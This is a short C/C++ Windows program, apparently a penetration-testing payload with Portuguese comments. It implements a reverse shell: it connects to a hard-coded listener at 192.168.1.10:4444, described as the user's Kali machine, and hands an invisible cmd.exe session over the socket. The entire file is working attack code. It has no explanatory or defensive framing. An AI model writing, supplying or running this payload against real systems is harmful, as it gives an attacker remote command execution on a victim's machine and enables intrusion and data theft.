#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in target;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    
    target.sin_family = AF_INET;
    target.sin_port = htons(4444);
    target.sin_addr.s_addr = inet_addr("192.168.1.10"); // Altere para o IP do seu Kali

    if (connect(sock, (sockaddr*)&target, sizeof(target)) != SOCKET_ERROR) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        // Redireciona os canais de entrada/saída para o socket
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        // Cria o processo cmd.exe invisível e conectado ao socket
        CreateProcessA(nullptr, (LPSTR)"cmd.exe", nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
        
        // Limpa os handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    closesocket(sock);
    WSACleanup();
    return 0;
}
